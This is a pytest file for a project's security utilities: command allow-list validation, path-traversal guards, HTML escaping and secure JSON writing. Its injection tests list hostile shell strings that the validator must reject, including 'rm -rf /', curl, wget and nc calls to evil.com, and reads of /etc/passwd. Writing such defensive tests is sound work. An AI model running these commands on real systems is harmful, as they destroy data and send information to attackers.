"""Tests for the security utility module."""

from __future__ import annotations

import json

import pytest

from pesquisai.utils.security import (
    ALLOWED_BINARIES,
    escape_html,
    read_json,
    safe_backup_path,
    secure_write_json,
    validate_command,
)


# ── validate_command ────────────────────────────────────────────────


class TestValidateCommand:
    def test_allows_opencode(self):
        assert validate_command("opencode") == "opencode"
        assert validate_command("opencode -s ses_abc") == "opencode -s ses_abc"

    def test_allows_export(self):
        assert validate_command("export X=Y") == "export X=Y"

    def test_allows_compound_safe_chain(self):
        # shlex.split on the *raw* string must not pull a forbidden
        # character into the result.
        assert validate_command('export X="hello world" && opencode') == \
            'export X="hello world" && opencode'

    @pytest.mark.parametrize(
        "bad",
        [
            "opencode; rm -rf /",
            "opencode && curl evil.com",
            "opencode || wget evil.com",
            "opencode | nc evil.com 1234",
            "`whoami`",
            "$(curl evil.com)",
            "opencode $IFS /etc/passwd",
            "opencode {foo,bar}",
            "opencode (echo pwn)",
            "opencode #comment\nrm -rf /",
            "opencode # rm -rf /",  # newline is what we reject here
        ],
    )
    def test_rejects_injection(self, bad):
        with pytest.raises(ValueError):
            validate_command(bad)

    def test_rejects_unknown_binary(self):
        with pytest.raises(ValueError):
            validate_command("python -c 'import os'")

    def test_rejects_empty(self):
        with pytest.raises(ValueError):
            validate_command("")
        with pytest.raises(ValueError):
            validate_command("   ")

    def test_rejects_non_string(self):
        with pytest.raises(ValueError):
            validate_command(None)  # type: ignore[arg-type]

    def test_allowlist_contains_expected(self):
        # Sanity: make sure the allow-list itself is not empty.
        assert "opencode" in ALLOWED_BINARIES
        assert "export" in ALLOWED_BINARIES


# ── safe_backup_path ────────────────────────────────────────────────


class TestSafeBackupPath:
    def test_returns_valid_path(self, tmp_path):
        backup_dir = tmp_path / "backups"
        backup_dir.mkdir()
        (backup_dir / "session.json").write_text("{}")
        result = safe_backup_path(str(backup_dir), "session.json")
        assert result is not None
        assert result.is_file()
        assert result.name == "session.json"

    def test_blocks_traversal(self, tmp_path):
        backup_dir = tmp_path / "backups"
        backup_dir.mkdir()
        # Create the target outside the backup dir so that
        # ``os.path.isfile`` succeeds if the resolution is *not*
        # caught by is_relative_to.
        outside = tmp_path / "passwd"
        outside.write_text("pwn")
        result = safe_backup_path(str(backup_dir), "../passwd")
        assert result is None

    def test_blocks_absolute(self, tmp_path):
        result = safe_backup_path(str(tmp_path), "/etc/passwd")
        assert result is None

    def test_blocks_null_byte(self, tmp_path):
        backup_dir = tmp_path / "backups"
        backup_dir.mkdir()
        result = safe_backup_path(str(backup_dir), "ok\x00.json")
        assert result is None

    def test_returns_none_for_missing_file(self, tmp_path):
        backup_dir = tmp_path / "backups"
        backup_dir.mkdir()
        result = safe_backup_path(str(backup_dir), "missing.json")
        assert result is None


# ── escape_html ─────────────────────────────────────────────────────


class TestEscapeHtml:
    def test_escapes_basic(self):
        assert escape_html("a&b<c>d") == "a&amp;b&lt;c&gt;d"

    def test_escapes_quotes(self):
        assert escape_html('"x"') == "&quot;x&quot;"
        assert escape_html("'y'") == "&#39;y&#39;"

    def test_handles_none(self):
        assert escape_html(None) == ""  # type: ignore[arg-type]

    def test_idempotent_for_plain(self):
        assert escape_html("plain.txt") == "plain.txt"


# ── secure_write_json ───────────────────────────────────────────────


class TestSecureWriteJson:
    def test_creates_file_with_0600(self, tmp_path):
        out = tmp_path / "sub" / "keys.json"
        secure_write_json(str(out), {"a": 1, "b": "x"})
        assert out.is_file()
        mode = out.stat().st_mode & 0o777
        assert mode == 0o600
        data = json.loads(out.read_text(encoding="utf-8"))
        assert data == {"a": 1, "b": "x"}


# ── read_json ───────────────────────────────────────────────────────


class TestReadJson:
    def test_returns_default_on_missing(self, tmp_path):
        assert read_json(tmp_path / "missing.json", default={}) == {}

    def test_returns_default_on_corrupt(self, tmp_path):
        f = tmp_path / "bad.json"
        f.write_text("{not json")
        assert read_json(f, default={"x": 1}) == {"x": 1}

    def test_returns_parsed_value(self, tmp_path):
        f = tmp_path / "good.json"
        f.write_text('{"a": 1}')
        assert read_json(f) == {"a": 1}
